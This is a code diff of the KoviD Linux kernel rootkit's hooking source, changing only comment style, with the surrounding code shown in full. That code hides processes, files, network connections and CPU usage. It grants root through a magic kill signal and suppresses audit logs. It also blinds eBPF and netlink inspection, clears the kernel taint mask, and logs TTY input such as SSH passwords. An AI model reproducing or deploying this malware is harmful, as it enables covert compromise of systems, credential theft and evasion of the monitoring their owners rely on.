@@ -1,9 +1,5 @@
-/**
- * Linux Kernel version <= 5.8.0
- * - hash
- *
- *  KoviD rootkit
- */
+//  KoviD rootkit
+// - hash
 
 #include <linux/ftrace.h>
 #include <linux/fdtable.h>
@@ -51,31 +47,27 @@ sys64 real_m_lseek;
 
 static DEFINE_SPINLOCK(hide_once_spin);
 
-/**
- * task
- * ├── hidden No → normal flow
- * └── hidden Yes
- *     └── Backdoor Yes
- *         ├── unhide and kill all back-doors
- *     └── Backdoor No
- *         ├── unhide task
- */
+// task
+// ├── hidden No → normal flow
+// └── hidden Yes
+//     └── Backdoor Yes
+//         ├── unhide and kill all back-doors
+//     └── Backdoor No
+//         ├── unhide task
 static asmlinkage long m_exit_group(struct pt_regs *regs)
 {
 	struct hidden_status status = { 0 };
 
-	/** load the status of PID */
+	// load the status of PID
 	if (!kv_find_hidden_pid(&status, current->pid))
 		goto orig;
 
-	/** Is backdoor? */
+	// back-door?
 	if (status.saddr) {
 		kv_unhide_task_by_pid_exit_group(current->pid);
 	} else {
-		/**
-         * it is regular hidden PID and needs to
-         * be shown before exiting
-         */
+		// it is regular hidden PID and needs to
+		// be shown before exiting
 		kv_hide_task_by_pid(current->pid, 0, NO_CHILDREN);
 	}
 
@@ -83,35 +75,33 @@ orig:
 	return real_m_exit_group(regs);
 }
 
-/*
- * task A (parent of B) <- hidden
- *     |
- *     ├ (clone) --- Task B (child, parent of C) <- hidden by sys_clone if A is hidden
- *     |      |
- *     |      └ (clone) --- Task C (child) <- hidden by sys_clone if B is hidden
- *
- * See m_exit_group()
- */
+// task A (parent of B) <- hidden
+//     |
+//     ├ (clone) --- Task B (child, parent of C) <- hidden by sys_clone if A is hidden
+//     |      |
+//     |      └ (clone) --- Task C (child) <- hidden by sys_clone if B is hidden
+//
+// See m_exit_group()
 static volatile bool hide_once;
 static asmlinkage long m_clone(struct pt_regs *regs)
 {
 	struct hidden_status status = { .saddr = 0 };
 	struct task_struct *task = current;
 
-	/** Only proceed if _parent_ IS hidden */
+	// Only proceed if _parent_ IS hidden
 	if (!kv_find_hidden_pid(&status, task->parent->pid))
 		goto m_clone;
 
-	/** Only proceed if _child_ ISN'T hidden */
+	// Only proceed if _child_ ISN'T hidden
 	status.saddr = 0;
 	if (!kv_find_hidden_pid(&status, task->pid)) {
 		kv_hide_task_by_pid(task->pid,
-				    status.saddr /* inherit parent's status */,
+				    status.saddr, // inherit parent's status
 				    NO_CHILDREN);
 	} else if (hide_once && status.saddr) {
-		/** allow 1 task to be hidden
-         * afterwards, but be careful to not
-         * spawn other children, can crash */
+		// allow 1 task to be hidden
+		// afterwards, but be careful to not
+		// spawn other children, can crash */
 		kv_reload_hidden_task(task);
 		spin_lock(&hide_once_spin);
 		hide_once = false;
@@ -122,23 +112,21 @@ m_clone:
 	return real_m_clone(regs);
 }
 
-/**
- * Handle activate/deactivate /proc/<name>
- * Handle privilege escalation
- */
+// Handle activate/deactivate /proc/<name>
+// Handle privilege escalation
 static asmlinkage long m_kill(struct pt_regs *regs)
 {
 	pid_t pid = (pid_t)PT_REGS_PARM1(regs);
 	unsigned long sig = (unsigned long)PT_REGS_PARM2(regs);
 
-	/** Open/Close commands interface */
+	// Open/Close commands interface
 	if (31337 == pid && SIGCONT == sig) {
 		if (kv_is_proc_interface_loaded())
 			kv_remove_proc_interface();
 		else
 			(void)kv_add_proc_interface();
 
-		/** root */
+		// root
 	} else if (666 == pid && SIGCONT == sig) {
 		struct pt_regs rootregs;
 		struct kernel_syscalls *kaddr = kv_kall_load_addr();
@@ -158,7 +146,7 @@ static asmlinkage long m_kill(struct pt_regs *regs)
 		kaddr->k_sys_setreuid(&rootregs);
 		prinfo("Cool! Now try 'su'\n");
 
-		/** The 1 next backdoor task will be hidden */
+		// The 1 next backdoor task will be hidden
 	} else if (171 == pid && SIGCONT == sig) {
 		spin_lock(&hide_once_spin);
 		hide_once = true;
@@ -170,10 +158,8 @@ leave:
 	return real_m_kill(regs);
 }
 
-/**
- * Given an fd, check if parent
- * directory is a match.
- */
+// Given an fd, check if parent
+// directory is a match.
 static bool is_sys_parent(unsigned int fd)
 {
 	struct dentry *dentry;
@@ -233,7 +219,7 @@ static bool _ftrace_intercept(struct pt_regs *regs)
 	if (!file)
 		goto out;
 
-	/** XXX: check this lock against race */
+	// XXX: check this lock against race
 	spin_lock(&file->f_lock);
 	file_path = file->f_path;
 	spin_unlock(&file->f_lock);
@@ -271,7 +257,7 @@ static asmlinkage long m_read(struct pt_regs *regs)
 	struct fs_file_node *fs = NULL;
 	bool is_dmesg = false;
 
-	/** call the real thing first */
+	// call the real thing first
 	rv = real_m_read(regs);
 
 	if (_ftrace_intercept(regs))
@@ -281,10 +267,10 @@ static asmlinkage long m_read(struct pt_regs *regs)
 	if (!fs || !fs->filename)
 		goto out;
 
-	/** special case :( */
+	// ugly hack special case :(
 	is_dmesg = !strcmp(fs->filename, "dmesg");
 
-	/** Apply only for a few commands */
+	// Apply only for a few commands
 	if ((!is_dmesg) && (strcmp(fs->filename, "cat") != 0) &&
 	    (strcmp(fs->filename, "tail") != 0) &&
 	    (strcmp(fs->filename, "grep") != 0))
@@ -301,12 +287,11 @@ static asmlinkage long m_read(struct pt_regs *regs)
 		if (!dest)
 			goto out;
 
-		/** if kovid is here, skip */
+		// if KoviD is here, skip
 		if (is_dmesg ||
 		    is_sys_parent((unsigned int)PT_REGS_PARM1(regs))) {
-			/** We'll add a new line
-             * without any timestamp
-             * */
+			// We'll add a new line
+			// without any timestamp
 			const char *obuf = "\n";
 			size_t olen = strlen(obuf);
 
@@ -329,10 +314,8 @@ out:
 	return rv;
 }
 
-/**
- * Stolen static/private helpers
- * from the kernel
- */
+// Stolen static/private helpers
+// from the kernel
 static inline void *u64_to_ptr(__u64 ptr)
 {
 	return (void *)(unsigned long)ptr;
@@ -383,7 +366,7 @@ static asmlinkage long m_bpf(struct pt_regs *regs)
 	void *key = NULL, *value = NULL;
 	unsigned long size = (unsigned int)PT_REGS_PARM3(regs);
 
-	/** Call original */
+	// Call original
 	ret = real_m_bpf(regs);
 	if (ret < 0)
 		goto out;
@@ -413,14 +396,12 @@ static asmlinkage long m_bpf(struct pt_regs *regs)
 			goto out;
 		}
 
-		/*
-         * To extract the value, we must traverse the stack:
-         * sys_bpf -> __sys_bpf -> map_lookup_elem
-         * In simpler terms, we need to recover the user pointer
-         * that is about to be returned to userspace. We'll then
-         * read, modify, and write it back. The goal is to nullify
-         * it if there's a match, ensuring it doesn't get used.
-         */
+		// To extract the value, we must traverse the stack:
+		// sys_bpf -> __sys_bpf -> map_lookup_elem
+		// In simpler terms, we need to recover the user pointer
+		// that is about to be returned to userspace. We'll then
+		// read, modify, and write it back. The goal is to nullify
+		// it if there's a match, ensuring it doesn't get used.
 		if (attr->map_type == BPF_MAP_TYPE_PERF_EVENT_ARRAY) {
 			u32 id;
 			void __user *ukey = u64_to_user_ptr(attr->key);
@@ -455,24 +436,20 @@ static asmlinkage long m_bpf(struct pt_regs *regs)
 			memset((char *)value + trace_len, 0,
 			       value_size - trace_len);
 
-			/**
-             * Now we check if value (stored syscall address)
-             * is one of us
-             */
+			// Now we check if value (stored syscall address)
+			// is one of us
 			s = _get_sys_addr(*(unsigned long *)value &
 					  0xfffffffffffffff0);
 			if (s != 0UL) {
 				void *v = kmalloc(value_size, GFP_KERNEL);
 				if (v) {
-					/** fetch userspace buffer and clear */
+					// fetch userspace buffer and clear
 					void __user *uvalue =
 						u64_to_user_ptr(attr->value);
 					memset(v, 0, value_size);
 
-					/**
-                     * Send the new empty value back to the userspace.
-                     * and pretend map value hasn't spin lock (-EINVAL),
-                     */
+					// Send the new empty value back to the userspace.
+					// and pretend map value hasn't spin lock (-EINVAL),
 					if (!copy_to_user((void *)uvalue,
 							  (void *)v,
 							  value_size))
@@ -510,7 +487,7 @@ static asmlinkage long m_recvmsg(struct pt_regs *regs)
 		return ret;
 	}
 
-	/** copy user-space msghdr to kernel-space */
+	// copy user-space msghdr to kernel-space
 	if (copy_from_user(&msg_kernel, umsg, sizeof(msg_kernel))) {
 		prerr("Failed to copy msghdr from user space\n");
 		return ret;
@@ -522,14 +499,14 @@ static asmlinkage long m_recvmsg(struct pt_regs *regs)
 		return ret;
 	}
 
-	/** __user *msg_iov */
+	// __user *msg_iov
 	if (copy_from_user(&iov_kernel, msg_kernel.msg_iov,
 			   sizeof(iov_kernel))) {
 		prerr("Failed to copy iovec from user space\n");
 		return ret;
 	}
 
-	/** iov_base can be NULL */
+	// iov_base can be NULL
 	if (!iov_kernel.iov_base ||
 	    !access_ok(iov_kernel.iov_base, iov_kernel.iov_len)) {
 		return ret;
@@ -541,7 +518,7 @@ static asmlinkage long m_recvmsg(struct pt_regs *regs)
 		return ret;
 	}
 
-	/** __user *iov_base */
+	// __user *iov_base
 	if (copy_from_user(kbuf, iov_kernel.iov_base, iov_kernel.iov_len)) {
 		prerr("Failed to copy data from user space\n");
 		goto leave;
@@ -564,16 +541,16 @@ static asmlinkage long m_recvmsg(struct pt_regs *regs)
 			if (remaining_len > offset) {
 				memmove(nlh, (char *)nlh + offset,
 					remaining_len - offset);
-				/** zero remaining of buffer */
+				// zero remaining of buffer
 				memset((char *)nlh + (remaining_len - offset),
 				       0, offset);
 			}
 
-			/** update remaining length and ret */
+			// update remaining length and ret
 			remaining_len -= offset;
 			ret -= offset;
 
-			/** do not increment nlh; stay at the same position */
+			// do not increment nlh; stay at the same position
 			continue;
 		}
 
@@ -581,27 +558,25 @@ static asmlinkage long m_recvmsg(struct pt_regs *regs)
 		nlh = NLMSG_NEXT(nlh, remaining_len);
 	}
 
-	/**
-	 * at this point, the message may have been modified.
-	 * If the checks below fail, return failure.
-	 * Alternatively, you could return the original 'ret' value,
-	 * but that would risk exposing the back-door
-	 */
+	// at this point, the message may have been modified.
+	// If the checks below fail, return failure.
+	// Alternatively, you could return the original 'ret' value,
+	// but that would risk exposing the back-door
 
-	/** validate remaining length */
+	// validate remaining length
 	if (remaining_len > iov_kernel.iov_len) {
 		prerr("netlink: buffer length mismatch! remaining_len = %zu, expected <= %zu\n",
 		      remaining_len, iov_kernel.iov_len);
 		goto err;
 	}
 
-	/** copy the modified buffer back to userspace */
+	// copy the modified buffer back to userspace
 	if (copy_to_user(iov_kernel.iov_base, kbuf, iov_kernel.iov_len)) {
 		prerr("netlink: failed to copy modified buffer back to user space\n");
 		goto err;
 	}
 
-	/** all good? */
+	// all good?
 	goto leave;
 
 err:
@@ -676,7 +651,7 @@ static bool _find_tcp4udp4_match_cb(struct task_struct *task, void *t)
 
 			if (s->sk_socket->file->f_inode ==
 			    fdt->fd[idx]->f_inode) {
-				/* found, notify */
+				// found, notify
 				spin_unlock(&files->file_lock);
 				goto found;
 			}
@@ -760,9 +735,7 @@ static bool _find_packet_rcv_iph_match_cb(__be32 addr, void *t)
 	return false;
 }
 
-/**
- * packet sniffers
- */
+// packet sniffers
 static int (*real_packet_rcv)(struct sk_buff *, struct net_device *,
 			      struct packet_type *, struct net_device *);
 static int m_packet_rcv(struct sk_buff *skb, struct net_device *dev,
@@ -809,11 +782,9 @@ static int m_tpacket_rcv(struct sk_buff *skb, struct net_device *dev,
 	return real_tpacket_rcv(skb, dev, pt, orig_dev);
 }
 
-/**
- * Hide CPU usage of any hidden task by
- * not counting ticks
- * if they come from hidden tasks
- */
+// Hide CPU usage of any hidden task by
+// not counting ticks
+// if they come from hidden tasks
 static void (*real_account_process_tick)(struct task_struct *, int);
 static void m_account_process_tick(struct task_struct *p, int user_tick)
 {
@@ -821,9 +792,7 @@ static void m_account_process_tick(struct task_struct *p, int user_tick)
 	real_account_process_tick(p, found ? 0 : user_tick);
 }
 
-/**
- * And do the same here for cputime
- */
+// And do the same here for cputime
 static void (*real_account_system_time)(struct task_struct *, int, u64);
 static void m_account_system_time(struct task_struct *p, int hardirq_offset,
 				  u64 cputime)
@@ -838,10 +807,9 @@ static struct audit_buffer *m_audit_log_start(struct audit_context *ctx,
 					      gfp_t gfp_mask, int type)
 {
 	const struct cred *c = current->real_cred;
-	/**
-     * This KauditD log is triggered during specific operations after privilege escalation.
-     * Legitimate root users may not follow this code path.
-     */
+
+	// This KauditD log is triggered during specific operations after privilege escalation.
+	// Legitimate root users may not follow this code path.
 	if (!c->uid.val && !c->gid.val && !c->suid.val && !c->sgid.val &&
 	    !c->euid.val && !c->egid.val && !c->fsuid.val && !c->fsgid.val) {
 		return NULL;
@@ -861,17 +829,16 @@ static int m_filldir(struct dir_context *ctx, const char *name, int namlen,
 		     loff_t offset, u64 ino, unsigned int d_type)
 #endif
 {
-	/** For certain hidden files we don't have inode number initially,
-     * when hidden with "hide-file-anywhere" but it is available here
-     * and it is updated below, if needed.
-     * Also for files hidden anywhere same file can live
-     * in multiple directories, thus inode number may
-     * be updated to the current directory being listed
-     */
+	// For certain hidden files we don't have inode number initially,
+	// when hidden with "hide-file-anywhere" but it is available here
+	// and it is updated below, if needed.
+	// Also for files hidden anywhere same file can live
+	// in multiple directories, thus inode number may
+	// be updated to the current directory being listed
 	if (fs_search_name(name, ino))
-	/** For kernels v6.1 and later, return 'true' to
-		 * stop iteration instead of '0'.
-		 */
+
+	//For kernels v6.1 and later, return 'true' to
+	// * stop iteration instead of '0'.
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 1, 0)
 		return true;
 #else
@@ -975,11 +942,9 @@ static ssize_t m_tty_read(struct kiocb *iocb, struct iov_iter *to)
 		flags |= (byte == '\r') ? R_RETURN : flags;
 		flags |= (byte == '\n') ? R_NEWLINE : flags;
 
-		/**
-		 * To handle SSH session data, it typically
-		 * comes one byte at a time, but there are instances when it comes
-		 * as a multi-byte stream, for example, during password input.
-		 */
+		// To handle SSH session data, it typically
+		// comes one byte at a time, but there are instances when it comes
+		// as a multi-byte stream, for example, during password input.
 		if ((app_flag & APP_FTP) && rv > 1) {
 			ttybuf[strcspn(ttybuf, "\r")] = '\0';
 			kv_tty_write(&tty_sys_ctx, uid, ttybuf, sizeof(ttybuf));
@@ -1053,15 +1018,13 @@ static long m_vfs_statx(int dfd, struct filename *filename, int flags,
 	const char *target = filename ? filename->name : "";
 #endif
 
-	/* call original first, I want stat */
+	// call original first, I want stat
 	long rv = real_vfs_statx(dfd, filename, flags, stat, request_mask);
 
-	/**
-     *  Return not found to userspace if target is present (file,dir),
-     *  otherwise count the number of hidden hard-links
-     *      and use it to decrement "Links:"
-     *  Check: if it can be optimized
-     * */
+	//  Return not found to userspace if target is present (file,dir),
+	//  otherwise count the number of hidden hard-links
+	//      and use it to decrement "Links:"
+	//  Check: if it can be optimized
 #if LINUX_VERSION_CODE < KERNEL_VERSION(5, 18, 0)
 	if (target != NULL &&
 	    !copy_from_user((void *)target, filename, __MAXLEN - 1)) {
@@ -1072,9 +1035,8 @@ static long m_vfs_statx(int dfd, struct filename *filename, int flags,
 			goto leave;
 		}
 
-		/* nothing found for this entry.
-         * Tamper 'nlink', if needed.
-         */
+		// nothing found for this entry.
+		// Tamper 'nlink', if needed.
 		if (S_ISDIR(stat->mode)) {
 			int count = fs_is_dir_inode_hidden(stat->ino);
 			if (count > 0) {
@@ -1096,9 +1058,6 @@ leave:
 	return rv;
 }
 
-/**
- * __x64 prefix is not always present
- */
 static unsigned long _load_syscall_variant(struct kernel_syscalls *ks,
 					   const char *str)
 {
@@ -1128,15 +1087,14 @@ static unsigned long _load_syscall_variant(struct kernel_syscalls *ks,
 }
 
 struct ftrace_hook {
-	/** Must not change declaration
-     * ordering for the following members.
-     * @See ft_hooks
-     */
+	// Must not change declaration
+	// ordering for the following members.
+	// @See ft_hooks
 	const char *name;
 	void *function;
 	void *original;
 
-	/** Syscall will incur in extra checks */
+	// Syscall will incur in extra checks
 	bool syscall;
 
 	unsigned long address;
@@ -1222,7 +1180,7 @@ struct kernel_syscalls *kv_kall_load_addr(void)
 		if (!ks.k_bpf_map_get)
 			prwarn("invalid data: bpf_map_get will not work\n");
 
-		/** Direct call. @see m_kill */
+		// Direct call. @see m_kill
 		ks.k_sys_setreuid = (sys64)_load_syscall_variant(
 			&ks, _sys_arch("sys_setreuid"));
 
@@ -1234,7 +1192,7 @@ struct kernel_syscalls *kv_kall_load_addr(void)
 		if (!ks.k_do_exit)
 			prwarn("invalid data: do_exit will not work\n");
 #endif
-		/** zero tainted_mask for the bits we care */
+		// zero tainted_mask for the bits we care
 		ks.tainted = (unsigned long *)ks.k_kallsyms_lookup_name(
 			"tainted_mask");
 
@@ -1284,9 +1242,8 @@ static int _fh_install_hook(struct ftrace_hook *hook)
 
 	hook->ops.func = fh_ftrace_thunk;
 
-	/** Note: For kernels >= v5.5 there is FTRACE_OPS_FL_PERMANENT
-     *  but then we'd not be stealth.
-     */
+	// Note: For kernels >= v5.5 there is FTRACE_OPS_FL_PERMANENT
+	// but then we'd not be stealth.
 	hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_RECURSION |
 			  FTRACE_OPS_FL_IPMODIFY;
 
@@ -1363,7 +1320,7 @@ static bool _sys_file_init(void)
 	len = min + (rnd % (max - min + 1));
 	tty = kv_util_random_AZ_string(len);
 
-	/** repeat */
+	// XXX: repeat, really?
 	get_random_bytes(&rnd, sizeof(rnd));
 	len = min + (rnd % (max - min + 1));
 	ssl = kv_util_random_AZ_string(len);
@@ -1423,7 +1380,7 @@ bool sys_init(void)
 				prinfo("sys_init: ftrace hook %d on %s\n", idx,
 				       ft_hooks[idx].name);
 
-			/** Init tty log */
+			// Init tty log
 			tty_sys_ctx =
 				kv_tty_open(&tty_sys_ctx, sys_get_ttyfile());
 			if (!tty_sys_ctx.fp) {
